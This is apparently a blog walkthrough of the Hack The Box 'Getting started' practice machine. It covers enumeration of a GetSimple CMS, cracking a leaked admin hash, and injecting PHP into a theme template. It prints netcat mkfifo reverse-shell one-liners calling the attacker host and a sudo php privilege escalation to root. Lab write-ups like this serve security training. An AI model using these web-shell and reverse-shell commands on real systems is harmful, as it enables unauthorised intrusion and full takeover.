---
title: Hack the box Getting started walkthrough
date: 2023-07-05 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, walkthrough, htb, getting started, getsimple, privilege escalation, sudoers misconfiguration]
img_path: /assets/img/posts/
---

![getting started](htb-getting-started-desc.png)
*Getting started*

>In this article we are going to assume the folling ip addresses:
>
>Local machine (attacker, localhost): 10.0.0.1
>
>Target machine (victim, Getting started box): 10.0.0.2
{: .prompt-info}

This will be a black-box approach, because we don't have any information about the target.

# Enumeration

We are going to scan the tartget machine to find out what services are running:

```
$ nmap -P0 -n -sV --open -oA gettingstarted_initial_scan 10.0.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

We can see that the target is a GNU/Linux (Ubuntu) host with a SSH server (OpenSSH 8.2p1) running on port 22 and a web service (Apache 2.4.41) running on port 80.

# Web footprinting

If we browse to the target, we sill se a `GetSimple` welcome screen

![welcome screen](htb-getting-started-welcome-screen.png)
*Welcome screen*

The page doesn't seem to look to good.
If we take a look at the source code we can see a lot of references to `http://gettingstarted.htb`:

![http://gettingstarted.htb references](htb-getting-started-getting-started-references.png)
*http://gettingstarted.htb references*

So we will fixt it adding `10.0.0.2` as `gettingstarted.htb` to our `/etc/hosts`:

```
$ echo "10.0.0.2 gettingstarted.htb" | sudo tee -a /etc/hosts
```

If we reload, the page will look much better:

![welcome screen fixed](htb-getting-started-welcome-screen-fixed.png)
*Welcome screen fixed*

We can see that we have an instance of a `GetSimple` blog and we can start to identify the technologies in use.

## Technologies in use

```
$ whatweb gettingstarted.htb
http://gettingstarted.htb [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.42.249], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
```

## Directory enumeration

Let's see if there are hidden directories we can check to get more information:

```
$ gobuster dir -u http://gettingstarted.htb --wordlist /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gettingstarted.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
XXXX/XX/XX XX:XX:XX Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 283]
/admin                (Status: 301) [Size: 324] [--> http://gettingstarted.htb/admin/]
/backups              (Status: 301) [Size: 326] [--> http://gettingstarted.htb/backups/]
/data                 (Status: 301) [Size: 323] [--> http://gettingstarted.htb/data/]
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 326] [--> http://gettingstarted.htb/plugins/]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 283]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 324] [--> http://gettingstarted.htb/theme/]
```

We can see a few interesting directories, among which stand out `/admin`.

### /admin

If we browse to the `/admin` directory (`http://gettingstarted.htb/admin`) we will find a login form:

![Admin login form](htb-getting-started-admin-login-form.png)
*Admin login form*

# Foothold

## /data/users/admin.xml

If we browse to the `/data/users` directory (`http://gettingstarted.htb/data/users`) we will find an `admin.xml` file with the admin account information:

```xml
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
```

Here, we have the admin user and hashed pasword.
As the password is hashed, we need to try to identify the hash used to get the plaintext password:

```
$ hash-identifier d033e22ae348aeb5660fc2140aec35850c4da997                  
...
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

Seems that the password is hashed with SHA1.
We can use some online SHA1 decrypter and we find that the password is "admin".

We have our admin login credentials (user/password): `admin/admin`, so we can log in.
Once we are logged as admin, in the `Supoort` section, we can see interesting information about the `GetSimple` blog and the server setup.

![Support information](htb-getting-started-support-information.png)
*Suppor information*

Now, we have the `GetSimple` version used, and we can search exploits for this version:

```
$ searchsploit getsimple       
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Getsimple CMS 2.01 - 'changedata.php' Cross-Site Scripting                                                                                                                 | php/webapps/34789.html
Getsimple CMS 2.01 - 'components.php' Cross-Site Scripting                                                                                                                 | php/webapps/34041.txt
Getsimple CMS 2.01 - Local File Inclusion                                                                                                                                  | php/webapps/12517.txt
Getsimple CMS 2.01 - Multiple Vulnerabilities                                                                                                                              | php/webapps/14338.html
Getsimple CMS 2.01 < 2.02 - Administrative Credentials Disclosure                                                                                                          | php/webapps/15605.txt
Getsimple CMS 2.03 - 'upload-ajax.php' Arbitrary File Upload                                                                                                               | php/webapps/35353.txt
Getsimple CMS 3.0 - 'set' Local File Inclusion                                                                                                                             | php/webapps/35726.py
Getsimple CMS 3.1.2 - 'path' Local File Inclusion                                                                                                                          | php/webapps/37587.txt
Getsimple CMS 3.2.1 - Arbitrary File Upload                                                                                                                                | php/webapps/25405.txt
GetSimple CMS 3.3.1 - Cross-Site Scripting                                                                                                                                 | php/webapps/43888.txt
Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting                                                                                                                      | php/webapps/32502.txt
Getsimple CMS 3.3.10 - Arbitrary File Upload                                                                                                                               | php/webapps/40008.txt
GetSimple CMS 3.3.13 - Cross-Site Scripting                                                                                                                                | php/webapps/44408.txt
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting                                                                                                                     | php/webapps/49726.py
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Authenticated)                                                                                                     | php/webapps/48850.txt
GetSimple CMS 3.3.4 - Information Disclosure                                                                                                                               | php/webapps/49928.py
GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery                                                                                                                   | php/webapps/49816.py
Getsimple CMS Items Manager Plugin - 'PHP.php' Arbitrary File Upload                                                                                                       | php/webapps/37472.php
GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery                                                                                                    | php/webapps/49774.py
GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting                                                                                               | php/webapps/49798.py
GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery (Add Admin)                                                                                             | php/webapps/48745.txt
GetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit)                                                                                                          | php/remote/46880.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We can see one intersting RCE (Remote Code Execution) for metasploit that could work.
Let's keep this in mind, put aside metasploit, and keep digging a little to try to solve the box without metasploit.

## Files section

Seems that we can upload files from the `Files` section, but does not work.

# Remote code execution

## Theme section

In the `Theme` section, under the tab `Edit theme`, we can edit the `template.php` file, but we can't load this page directly.
Why? Because the code says so.
Let's see if we can get a command execution here.
We will comment or delete all code in `template.php` and we will edit the file appending the following php code at the beginning:

```php
<?php system('id'); ?>
```

![PHP code execution test](htb-getting-started-php-code-execution-test.png)
*PHP code execution test*

We save changes and we can curl this file (`http://gettingstarted.htb/theme/Innovation/template.php`), or browse it, and we see that we have a RCE (remote code execution).

```
$ curl http://gettingstarted.htb/theme/Innovation/template.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now we have a RCE (remote code execution) and we need to take advantage of this RCE to convert it in a remote shell.

We will edit again the `template.php` file.
But, this time, we will append the following bash one-liner reverse shell to the beginning:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"); ?>
```

![Bash reverse shell](htb-getting-started-bash-reverse-shell.png)
*Bash reverse shell*

We need to start a netcat listener on our host (the attacker):

```
$ nc -lvnp 1234
```

We have to curl or browse to he `template.php` file (`http://gettingstarted.htb/theme/Innovation/template.php`), again, to execute the reverse shell.
Now, we have a working reverse shell.

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

If we check the `/home` directory we will see that the `/home/mrb3n` is world-readable:

```
$ ls -la /home/
total 12
drwxr-xr-x  3 root  root  4096 Feb  9  2021 .
drwxr-xr-x 20 root  root  4096 Feb  9  2021 ..
drwxr-xr-x  3 mrb3n mrb3n 4096 May  7  2021 mrb3n
```

We can see that our fist flag (the `user.txt`) is also world-readable:

```
$ ls -la /home/mrb3n
total 40
drwxr-xr-x 3 mrb3n mrb3n  4096 May  7  2021 .
drwxr-xr-x 3 root  root   4096 Feb  9  2021 ..
lrwxrwxrwx 1 mrb3n mrb3n     9 Feb  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mrb3n mrb3n   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 mrb3n mrb3n  3771 Feb 25  2020 .bashrc
drwx------ 2 mrb3n mrb3n  4096 Feb  9  2021 .cache
-rw-r--r-- 1 mrb3n mrb3n   807 Feb 25  2020 .profile
-rw-r--r-- 1 mrb3n mrb3n     0 Feb  9  2021 .sudo_as_admin_successful
-rw------- 1 mrb3n mrb3n 10332 May  7  2021 .viminfo
-rw-rw-r-- 1 mrb3n mrb3n    33 Feb 16  2021 user.txt
```

So, we can read our first flag directly:

```
$ cat /home/mrb3n/user.txt
```

# Privilege escalation

Now that we have our fist flag, we need to escalate privileges in order to get our second flag, the `root.txt`.
If we check our sudo privileges we will see that we can execute `/usr/bin/php` as root without password:

```
$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

Since our current directory (`/var/www/html/theme/Innovation`) is writable, we can create a PHP file with a bash one-liner reverse shell:

```
$ pwd
/var/www/html/theme/Innovation
$ ls -la /var/www/html/theme
total 16
drwxr-xr-x 4 www-data www-data 4096 Feb  9  2021 .
drwxr-xr-x 7 www-data www-data 4096 May  7  2021 ..
drwxr-xr-x 3 www-data www-data 4096 Sep  7  2018 Cardinal
drwxr-xr-x 4 www-data www-data 4096 Sep  7  2018 Innovation
```

```
$ echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1235 >/tmp/f"); ?>' > reverse_shell.php
```

Now, we need to start another netcat listener on our host (the attacker):

```
$ nc -lvnp 1235
```

And now, we have to execute our new file with `sudo` in order to get our root reverse shell:

```
$ sudo /usr/bin/php reverse_shell.php
```

Finally, we are root and we can get our last flag, the `root.txt`:

```
# cat /root/root.txt
```

*Enjoy! ;)*
